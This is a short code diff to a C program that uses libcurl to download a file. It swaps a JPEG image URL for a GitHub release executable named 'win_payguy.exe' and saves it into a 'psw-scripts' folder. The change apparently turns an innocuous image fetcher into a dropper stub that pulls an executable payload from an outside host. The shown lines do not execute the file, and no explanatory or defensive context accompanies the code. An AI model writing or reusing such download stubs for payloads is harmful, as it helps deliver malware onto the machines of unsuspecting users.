@@ -8,9 +8,9 @@ size_t WriteCallback(void* contents, size_t size, size_t nmemb, void* userp) {
 }
 
 int main() {
-    const char* url = "https://raw.githubusercontent.com/smukx/smukx.github.io/main/images/smukx1920.jpg";
+    const char* url = "https://github.com/Whitecat18/Mavoc/releases/download/v1.0.0/win_payguy.exe";
     
-    const char* outputFilePath = "files/picture.jpg";
+    const char* outputFilePath = "psw-scripts/win_payguy.exe";
 
     CURL* curl = curl_easy_init();
     if (curl) {
